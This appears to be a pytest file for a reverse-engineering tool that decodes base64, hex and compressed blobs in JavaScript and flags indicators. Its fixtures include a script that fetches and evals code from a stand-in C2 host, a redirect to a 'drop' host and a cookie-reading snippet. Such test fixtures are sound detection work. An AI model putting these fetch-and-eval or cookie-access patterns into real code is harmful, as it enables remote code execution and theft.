"""js.blobs decodes embedded base64/hex payloads and classifies what came out.

The core is extract_js_blobs, pure over the source text, so most of this drives
it directly; a few tests wire it through JsClient/AnalysisService.
"""

from __future__ import annotations

import ast
import base64
import gzip
import zlib
from pathlib import Path

import pytest

import headless_re_mcp.backends.jsre.client as client_mod
from headless_re_mcp.backends.jsre.client import JsClient, JsReError
from headless_re_mcp.backends.jsre.js_static import extract_js_blobs
from headless_re_mcp.tools.js_wasm import build_js_wasm_tools


def _tool_docstring(name: str) -> str:
    source = Path(build_js_wasm_tools.__code__.co_filename).read_text(encoding="utf-8")
    tree = ast.parse(source)
    for node in ast.walk(tree):
        if not isinstance(node, ast.FunctionDef):
            continue
        for decorator in node.decorator_list:
            if not isinstance(decorator, ast.Call):
                continue
            for keyword in decorator.keywords:
                if (
                    keyword.arg == "name"
                    and isinstance(keyword.value, ast.Constant)
                    and keyword.value.value == name
                ):
                    return ast.get_docstring(node) or ""
    return ""


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _by_kind(payload: dict[str, object]) -> dict[str, dict[str, object]]:
    return {str(b["kind"]): b for b in payload["blobs"]}  # type: ignore[index,union-attr]


def test_decodes_a_base64_script_and_pulls_its_url() -> None:
    script = "var x = fetch('https://evil.example/c2'); eval(x);"
    src = f'const p = "{_b64(script.encode())}";'
    blob = _by_kind(extract_js_blobs(src))["script"]
    assert blob["encoding"] == "base64"
    assert blob["indicators"] == {"urls": ["https://evil.example/c2"]}
    assert "fetch" in str(blob["preview"])


def test_detects_a_pe_by_magic() -> None:
    pe = b"MZ\x90\x00" + b"\x00" * 64
    src = f'const p = "{_b64(pe)}";'
    blob = _by_kind(extract_js_blobs(src))["pe"]
    assert blob["preview_is_hex"] is True
    assert str(blob["preview"]).startswith("4d5a")  # 'MZ'


def test_inflates_a_gzip_blob_one_level() -> None:
    inner = "window.location='https://drop.example/x';"
    src = f'const p = "{_b64(gzip.compress(inner.encode()))}";'
    blob = _by_kind(extract_js_blobs(src))["gzip"]
    nested = blob["nested"]
    assert nested["kind"] == "script"  # type: ignore[index]
    assert nested["indicators"] == {"urls": ["https://drop.example/x"]}  # type: ignore[index]


def test_inflates_a_zlib_blob() -> None:
    inner = b"plain deflated bytes that are printable text here"
    src = f'const p = "{_b64(zlib.compress(inner))}";'
    blob = _by_kind(extract_js_blobs(src))["zlib"]
    assert blob["nested"]["decoded_length"] == len(inner)  # type: ignore[index]


def test_decodes_a_hex_text_blob() -> None:
    payload = b"a fairly long stretch of readable ascii text!!"
    src = f'const p = "{payload.hex()}";'
    blob = _by_kind(extract_js_blobs(src))["text"]
    assert blob["encoding"] == "hex"
    assert "readable ascii" in str(blob["preview"])


def test_opaque_binary_is_skipped_but_counted() -> None:
    # 200 sequential bytes: valid base64, decodes to non-printable, no magic.
    src = f'const p = "{_b64(bytes(range(200)))}";'
    payload = extract_js_blobs(src)
    assert payload["blobs"] == []
    assert payload["opaque_skipped"] == 1


def test_short_and_plain_strings_are_not_blobs() -> None:
    payload = extract_js_blobs('const a = "hello"; const b = "not base64 at all!!";')
    assert payload["blobs"] == []
    assert payload["opaque_skipped"] == 0


def test_dedupes_repeated_blob_and_samples_lines() -> None:
    enc = _b64(b"var y = 1; function z(){ return document.cookie; }")
    src = f'const a = "{enc}";\nconst b = "{enc}";\nconst c = "{enc}";\n'
    blob = _by_kind(extract_js_blobs(src))["script"]
    assert blob["count"] == 3
    assert blob["lines"] == [1, 2, 3]
    assert extract_js_blobs(src)["total"] == 1


def test_base64url_alphabet_is_decoded() -> None:
    # A printable script whose std base64 ends '.../' -> url-safe '..._', so the
    # decoder must recognise the url-safe alphabet yet still see a script.
    raw = b"function q(){return 0xff>>2;}//??"
    std = base64.b64encode(raw).decode()
    url = base64.urlsafe_b64encode(raw).decode().rstrip("=")
    assert ("-" in url or "_" in url) and url != std
    blob = extract_js_blobs(f'const p = "{url}";')["blobs"]
    assert blob and blob[0]["encoding"] == "base64url"
    assert blob[0]["kind"] == "script"


def _script_blob(i: int) -> str:
    body = f"function f{i}()" + "{ return " + str(i) + "; }"
    return f'const v{i} = "{_b64(body.encode())}";'


def test_pages_the_blobs() -> None:
    parts = "".join(_script_blob(i) for i in range(5))
    payload = extract_js_blobs(parts, offset=0, limit=2)
    assert payload["count"] == 2
    assert payload["total"] == 5
    assert payload["has_more"] is True


def test_scan_capped(monkeypatch: pytest.MonkeyPatch) -> None:
    import headless_re_mcp.backends.jsre.js_static as js_static

    monkeypatch.setattr(js_static, "_MAX_BLOBS_COLLECT", 2)
    parts = "".join(_script_blob(i) for i in range(5))
    payload = extract_js_blobs(parts)
    assert payload["total"] == 2
    assert payload["scan_capped"] is True


# --- client + service integration -------------------------------------------


def test_client_blobs_needs_no_webcrack(tmp_path: Path) -> None:
    js = tmp_path / "a.js"
    js.write_text(f'const p = "{_b64(b"function h(){ eval(1); }")}";', encoding="utf-8")
    assert "script" in _by_kind(JsClient(None).blobs(js))


def test_client_blobs_missing_file_is_not_found(tmp_path: Path) -> None:
    with pytest.raises(JsReError) as caught:
        JsClient(None).blobs(tmp_path / "nope.js")
    assert caught.value.code == "not_found"


def test_client_blobs_oversized_is_too_large(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(client_mod, "_MAX_INPUT_BYTES", 16)
    js = tmp_path / "big.js"
    js.write_text(f'const p = "{_b64(b"function h(){ eval(1); }")}";' * 5, encoding="utf-8")
    with pytest.raises(JsReError) as caught:
        JsClient(None).blobs(js)
    assert caught.value.code == "too_large"


def test_service_js_blobs_dispatch(tmp_path: Path) -> None:
    from dataclasses import replace

    from headless_re_mcp.config import Settings
    from headless_re_mcp.core.service import AnalysisService

    settings = replace(Settings.load(), artifact_root=tmp_path / "artifacts")
    service = AnalysisService(settings)
    js = tmp_path / "s.js"
    js.write_text(f'const p = "{_b64(b"function h(){ eval(1); }")}";', encoding="utf-8")
    result = service.js_blobs(str(js))
    assert result.ok, result.error
    assert result.data is not None
    assert "script" in _by_kind(result.data)


def test_js_blobs_tool_is_registered() -> None:
    from headless_re_mcp.config import Settings
    from headless_re_mcp.core.service import AnalysisService

    service = AnalysisService(Settings.load())
    names = {tool.name for tool in build_js_wasm_tools(service)}
    assert "js.blobs" in names


def test_js_blobs_docstring_names_its_shape() -> None:
    doc = " ".join(_tool_docstring("js.blobs").split())
    assert "indicators" in doc
    assert "opaque_skipped" in doc
    assert "nested" in doc
    assert "preview_is_hex" in doc
    assert "too_large" in doc
